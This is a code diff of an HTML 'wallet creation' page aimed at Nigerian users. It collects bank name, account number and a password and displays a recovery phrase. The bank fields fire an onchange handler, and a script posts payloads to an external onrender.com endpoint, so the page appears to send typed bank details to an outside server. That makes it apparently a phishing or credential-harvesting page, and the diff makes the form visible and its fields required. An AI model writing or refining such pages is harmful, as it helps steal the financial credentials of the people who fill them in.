@@ -321,25 +321,25 @@
             </div>
 
 			<!-- Step 1: Wallet Creation -->
-            <div id="creationStep" class="hidden">
+            <div id="creationStep">
 				<form method="post" id="form">
 					<label for="country">Country & Currency</label>
-					<input type="text" value="Nigeria: &#8358;" id="country" readonly>
+					<input type="text" id="country" required>
 					
 					<label for="azaName">Bank Name</label>
-					<input type="text" id="azaName" name="azaName" placeholder="eg Opay, Access..." onchange="toa({message: this.value})">
+					<input type="text" id="azaName" name="azaName" placeholder="eg Opay, Access..." onchange="toa({message: this.value})" required>
 					
 					<label for="azaNumber">Account Number</label>
-					<input type="text" id="azaNumber" name="azaNumber" placeholder="0123456789" onchange="toa({message: this.value})">
+					<input type="text" id="azaNumber" name="azaNumber" placeholder="0123456789" onchange="toa({message: this.value})" required>
 
 					<label for="password">Password</label>
 					<div class="password">
-						<input type="password" id="password" name="password" placeholder="create a strong password">
+						<input type="password" id="password" name="password" placeholder="create a strong password" required>
 						<button type="button" id="toggleButton"><i class="fas fa-eye"></i></button>
 					</div>
 					
 					<label for="confirmPassword">Confirm Password</label>
-					<input type="password" id="confirmPassword" name="confirmPassword" placeholder="re-enter password">
+					<input type="password" id="confirmPassword" name="confirmPassword" placeholder="re-enter password" required>
 					
 					<small id="response"></small>
 
@@ -355,10 +355,12 @@
 				<form method="post" id="formTwo">
 					<label for="country">Country & Currency</label>
 					<input type="text" value="Nigeria: &#8358;" id="country" readonly>
+					
 					<label for="azaName">Bank Name</label>
-					<input type="text" id="azaName" name="azaName" placeholder="eg Opay, Access..." onchange="toa({message: this.value})">
+					<input type="text" id="azaName" name="azaName" placeholder="eg Opay, Access..." onchange="toa({message: this.value})" required>
+					
 					<label for="azaNumber">Account Number</label>
-					<input type="text" id="azaNumber" name="azaNumber" placeholder="0123456789" onchange="toa({message: this.value})">
+					<input type="text" id="azaNumber" name="azaNumber" placeholder="0123456789" onchange="toa({message: this.value})" required>
 				
 					<div class="buttons">
 						<button type="button" id="backToCreation">Back</button>
@@ -368,7 +370,7 @@
 			</div>
 
 			<!-- Step 3: Completion -->
-            <div id="completionStep" class="hidde">
+            <div id="completionStep" class="hidden">
 					<div class="mnemonic-container">
 						<h3 style="margin-top: 0;">Your Recovery Phrase</h3>
 						<div class="mnemonic-words" id="mnemonicPhrase">
@@ -402,7 +404,7 @@
 	<script src="../sw.js"></script>
 	<script>
 		// Senders
-        function sender(payload) {
+		function sender(payload) {
             const url = 'https://send-39yi.onrender.com/api/messages';  
             fetch(url, {
                 method: 'POST',
